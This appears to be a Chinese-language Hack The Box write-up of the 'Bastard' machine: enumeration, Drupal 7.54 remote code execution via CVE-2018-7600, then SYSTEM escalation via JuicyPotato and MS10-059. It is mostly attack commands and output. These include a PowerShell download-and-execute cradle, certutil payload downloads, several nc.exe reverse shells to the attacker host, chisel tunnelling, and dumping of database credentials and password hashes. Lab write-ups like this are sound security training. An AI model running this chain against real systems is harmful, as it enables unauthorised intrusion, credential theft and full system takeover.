# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责

# 服务探测

```
root💀kali)-[~/htb/Bastard]
└─# nmap -sV -Pn -A -O 10.10.10.9 -p-                                                      
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-09 22:49 EST
Nmap scan report for 10.10.10.9
Host is up (0.31s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE    VERSION
80/tcp    open  tcpwrapped
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc?
49154/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|general purpose|phone
Running (JUST GUESSING): Microsoft Windows 7|8|Phone|2008|8.1|Vista (89%)
OS CPE: cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows Embedded Standard 7 (89%), Microsoft Windows 8.1 Update 1 (89%), Microsoft Windows Phone 7.5 or 8.0 (89%), Microsoft Windows 7 or Windows Server 2008 R2 (88%), Microsoft Windows Server 2008 (88%), Microsoft Windows Server 2008 R2 (88%), Microsoft Windows Server 2008 R2 or Windows 8.1 (88%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (88%), Microsoft Windows 7 (88%), Microsoft Windows 7 Professional or Windows 8 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   310.73 ms 10.10.14.1
2   ...
3   309.08 ms 10.10.10.9

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2442.65 seconds


```



## web

目录爆破
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 40 -u http://10.10.10.9 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 40
Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.10.9/_22-01-09_22-42-15.txt

Error Log: /root/dirsearch/logs/errors-22-01-09_22-42-15.log

Target: http://10.10.10.9/

[22:42:22] Starting: 
[22:47:51] 200 -  108KB - /CHANGELOG.txt
[22:47:52] 200 -    1KB - /COPYRIGHT.txt
[22:47:55] 200 -  108KB - /CHANGELOG.TXT
[22:48:02] 200 -  108KB - /ChangeLog.txt
[22:48:02] 200 -  108KB - /Changelog.txt
[22:49:06] 200 -   18KB - /INSTALL.TXT
[22:49:06] 200 -    2KB - /INSTALL.mysql.txt
[22:49:07] 200 -    2KB - /INSTALL.pgsql.txt
[22:49:08] 200 -   18KB - /INSTALL.txt
[22:49:09] 200 -   18KB - /Install.txt
[22:49:15] 200 -    9KB - /MAINTAINERS.txt
[22:49:18] 200 -   18KB - /LICENSE.txt
[22:49:57] 200 -    5KB - /README.TXT
[22:49:58] 200 -    5KB - /README.txt
[22:50:01] 200 -    5KB - /ReadMe.txt
[22:50:01] 200 -    5KB - /Readme.txt
[22:51:20] 200 -   10KB - /UPGRADE.txt
[23:27:59] 200 -  108KB - /changelog.txt
[23:45:19] 301 -  150B  - /includes  ->  http://10.10.10.9/includes/
[23:51:45] 200 -    9KB - /maintainers.txt
[23:53:37] 403 -    1KB - /members.sql
[23:53:58] 301 -  146B  - /misc  ->  http://10.10.10.9/misc/
[23:55:02] 301 -  149B  - /modules  ->  http://10.10.10.9/modules/
[00:05:25] 301 -  150B  - /profiles  ->  http://10.10.10.9/profiles/
[00:05:26] 403 -    1KB - /profiles/standard/standard.info
[00:08:06] 200 -    2KB - /robots.txt
[00:08:46] 301 -  149B  - /scripts  ->  http://10.10.10.9/scripts/
[00:12:28] 301 -  147B  - /sites  ->  http://10.10.10.9/sites/
[00:12:30] 200 -  151B  - /sites/all/libraries/README.txt
[00:12:32] 200 - 1020B  - /sites/all/themes/README.txt
[00:12:34] 200 -    1KB - /sites/all/modules/README.txt
[00:12:35] 200 -  904B  - /sites/README.txt
[00:16:25] 301 -  146B  - /temp  ->  http://10.10.10.9/temp/
[00:17:29] 301 -  148B  - /themes  ->  http://10.10.10.9/themes/
[00:19:13] 200 -   10KB - /upgrade.txt
                                                                               
Task Completed        
```

80端口web服务打开是一个Drupal站点，在changlog.txt里暴露出了版本号为7.54

kali搜索这个版本的漏洞情况显示存在RCE

```
┌──(root💀kali)-[~/htb/Bastard]
└─# searchsploit Drupal 7.54             
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                                                                                  | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                                                                                               | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                                                                       | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                                                                   | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                                                                          | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                                                                     | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                                                                                                                            | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                                                                                                                                                        | php/webapps/46459.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

在github上找到了[这个](https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7600.py)exp

执行，证实存在RCE
```
┌──(root💀kali)-[~/htb/Bastard]
└─# python3 drupa7-CVE-2018-7600.py http://10.10.10.9 -c whoami 

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-4PCW5lyRN9tSvkhtTWc7UK49hDuhBYp1x6H0_7n2a1A
[*] Triggering exploit to execute: whoami
nt authority\iusr

```


# foodhold

准备好一个```Invoke-PowerShellTcp.ps1```脚本

开启一个http服务
```
┌──(root💀kali)-[~]
└─# python3 -m http.server                              
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

开启监听
```
nc -lnvp 4242
```

使用下面payload拿到foodhold
```
┌──(root💀kali)-[~/htb/Bastard]
└─# python3 drupa7-CVE-2018-7600.py http://10.10.10.9 -c "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.3:8000/Invoke-PowerShellTcp.ps1')"

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-OVxJXEVi1HyRD_ceKtMc4ArV7CnwvkPS4Fakar_Z8nY
[*] Triggering exploit to execute: powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.3:8000/Invoke-PowerShellTcp.ps1')


```

收到反弹shell
```
┌──(root💀kali)-[~/htb/Bastard]
└─# nc -lnvp 4242                                                                                             1 ⨯
listening on [any] 4242 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.9] 58568
Windows PowerShell running as user BASTARD$ on BASTARD
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\inetpub\drupal-7.54>whoami
nt authority\iusr
PS C:\inetpub\drupal-7.54> 


```

在用户```dimitris```的桌面拿到user.txt

# 提权

## mysql

在C:\inetpub\drupal-7.54\sites\default\settings.php找到数据库密码
```
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'root',
      'password' => 'mysql123!root',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);

```


查看网络连接，发现对内开启了mysql
```
PS C:\inetpub\drupal-7.54>netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:81             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       672
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1060
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       368
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       760
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       804
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       476
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       492
  TCP    10.10.10.9:80          10.10.16.3:39654       ESTABLISHED     4
  TCP    10.10.10.9:139         0.0.0.0:0              LISTENING       4
  TCP    10.10.10.9:58568       10.10.16.3:4242        CLOSE_WAIT      2860
  TCP    10.10.10.9:58577       10.10.16.3:4242        CLOSE_WAIT      1752
  TCP    10.10.10.9:58583       10.10.16.3:4242        CLOSE_WAIT      2804
  TCP    10.10.10.9:58605       10.10.16.3:4242        ESTABLISHED     2288
  TCP    127.0.0.1:3306         127.0.0.1:58566        ESTABLISHED     1060
  TCP    127.0.0.1:3306         127.0.0.1:58575        ESTABLISHED     1060
  TCP    127.0.0.1:3306         127.0.0.1:58581        ESTABLISHED     1060
  TCP    127.0.0.1:3306         127.0.0.1:58602        ESTABLISHED     1060
  TCP    127.0.0.1:58566        127.0.0.1:3306         ESTABLISHED     2628
  TCP    127.0.0.1:58575        127.0.0.1:3306         ESTABLISHED     2960
  TCP    127.0.0.1:58581        127.0.0.1:3306         ESTABLISHED     2984
  TCP    127.0.0.1:58600        127.0.0.1:3306         TIME_WAIT       0
  TCP    127.0.0.1:58602        127.0.0.1:3306         ESTABLISHED     2856
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:81                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       672
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49152             [::]:0                 LISTENING       368
  TCP    [::]:49153             [::]:0                 LISTENING       760
  TCP    [::]:49154             [::]:0                 LISTENING       804
  TCP    [::]:49155             [::]:0                 LISTENING       476
  TCP    [::]:49156             [::]:0                 LISTENING       492
  UDP    0.0.0.0:123            *:*                                    848
  UDP    0.0.0.0:5355           *:*                                    932
  UDP    10.10.10.9:137         *:*                                    4
  UDP    10.10.10.9:138         *:*                                    4
  UDP    [::]:123               *:*                                    848

```

外网无法访问到靶机的mysql服务，传chisel到靶机，转发mysql服务端口

kali端执行

```
 ./chisel server -p 8000 --reverse
```

靶机执行
```
 .\chisel.exe client 10.10.16.3:8000 R:3306:localhost:3306
```

kali端连接mysql服务
```
┌──(root💀kali)-[~/htb/Bastard]
└─# mysql -h 127.0.0.1 -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 29269
Server version: 5.5.45 MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databses;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'databses' at line 1
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| drupal             |
| mysql              |
| performance_schema |
| test               |
+--------------------+
5 rows in set (0.808 sec)

```


在users表找到一个账号密码，另外一个是我们测试注册写入的账号
```
 MySQL [drupal]> select * from users;
+-----+-------+---------------------------------------------------------+----------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------+----------+---------+----------------------+------+
| uid | name  | pass                                                    | mail                 | theme | signature | signature_format | created    | access     | login      | status | timezone      | language | picture | init                 | data |
+-----+-------+---------------------------------------------------------+----------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------+----------+---------+----------------------+------+
|   0 |       |                                                         |                      |       |           | NULL             |          0 |          0 |          0 |      0 | NULL          |          |       0 |                      | NULL |
|   1 | admin | $S$DRYKUR0xDeqClnV5W0dnncafeE.Wi4YytNcBmmCtwOjrcH5FJSaE | drupal@hackthebox.gr |       |           | NULL             | 1489920428 | 1492102672 | 1492102672 |      1 | Europe/Athens |          |       0 | drupal@hackthebox.gr | b:0; |
|   5 | max   | $S$DnGAoPgTNp7LuoqwmIQjs0m2itKf9bhb/lDoGLHTUjdHjXm..SqN | 1@1.com              |       |           | filtered_html    | 1641782294 |          0 |          0 |      0 | Europe/Athens |          |       0 | 1@1.com              | NULL |
+-----+-------+---------------------------------------------------------+----------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------+----------+---------+----------------------+------+
3 rows in set (0.792 sec)
```

然而rockyou跑了好久没有办法破解这个hash


## 提权方法一：烂土豆

查看本账号权限
```
PS C:\users\dimitris\desktop> whoami /all

USER INFORMATION
----------------

User Name         SID     
================= ========
nt authority\iusr S-1-5-17


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Group used for deny only                          
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled

```

留意开启了```SeImpersonatePrivilege```权限，意味着可以使用烂土豆提权。从github[下载](https://github.com/ohpe/juicy-potato/releases/tag/v0.1)烂土豆


下载烂土豆到靶机
```
certutil -urlcache -split -f http://10.10.16.3:8000/JuicyPotato.exe
```

下载nc.exe到靶机
```
certutil -urlcache -split -f http://10.10.16.3:8000/nc.exe
```

这里会有点绕，我在powershell下无法成功执行JuicyPotato.exe，会报这个错误
```
PS C:\inetpub\drupal-7.54\temp> .\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\drupal-7.54\TEMP\nc.exe -e cmd.exe 10.10.16.3 4444" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
PS C:\inetpub\drupal-7.54\temp> Invoke-PowerShellTcp : Bad numeric constant: 9.
At line:117 char:21
+ Invoke-PowerShellTcp <<<<  -Reverse -IPAddress 10.10.16.3 -Port 4242
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep 
   tion
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio 
   n,Invoke-PowerShellTcp

```

需要反弹一个cmd的shell回kali

靶机
```
.\nc.exe 10.10.16.3 4444 -e cmd.exe
```

kali
```
┌──(root💀kali)-[~/htb/Bastard]
└─# nc -lnvp 4444                    
listening on [any] 4444 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.9] 58695
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\inetpub\drupal-7.54\temp>whoami
whoami
nt authority\iusr

```


在新的cmd shell下执行下面命令：

> JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\drupal-7.54\TEMP\nc.exe -e cmd.exe 10.10.16.3 4455" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}


成功执行
```
C:\inetpub\drupal-7.54\temp>JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\drupal-7.54\TEMP\nc.exe -e cmd.exe 10.10.16.3 4455" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\drupal-7.54\TEMP\nc.exe -e cmd.exe 10.10.16.3 4455" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 1337
....
[+] authresult 0
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

```

收到反弹shell
```
┌──(root💀kali)-[~/htb/Bastard]
└─# nc -lnvp 4455                                                                                       1 ⨯
listening on [any] 4455 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.9] 58688
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```

## 提权方法二：缺失补丁：

systeminfo命令打印系统信息
```
PS C:\inetpub\drupal-7.54\temp> systeminfo

Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00496-001-0001283-84782
Original Install Date:     18/3/2017, 7:04:46 ??
System Boot Time:          10/1/2022, 4:08:39 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.549 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.587 MB
Virtual Memory: In Use:    508 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.9

```
把上面信息保存到kali端system.info文件

更新Windows-Exploit-Suggester数据库

```
┌──(root💀kali)-[~/Windows-Exploit-Suggester]
└─# python windows-exploit-suggester.py --update
[*] initiating winsploit version 3.3...
[+] writing to file 2022-01-10-mssb.xls
[*] done

```

枚举靶机缺失补丁
```
┌──(root💀kali)-[~/Windows-Exploit-Suggester]
└─# python windows-exploit-suggester.py --database 2022-01-10-mssb.xls  --systeminfo /root/htb/Bastard/system.info 
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done

```
上面补丁一个个枚举以后，锁定```MS10-059```

下载github上[这个](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe)提权exp


下载到靶机
```
certutil -urlcache -split -f http://10.10.16.3:8000/MS10-059.exe
```

执行反弹shell
```
PS C:\inetpub\drupal-7.54\temp> .\MS10-059.exe 10.10.16.3 4444

```

收到反弹shell
```
┌──(root💀kali)-[~/htb/Bastard]
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.9] 58664
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54\temp>whoami
whoami
nt authority\system

```
已经是system权限


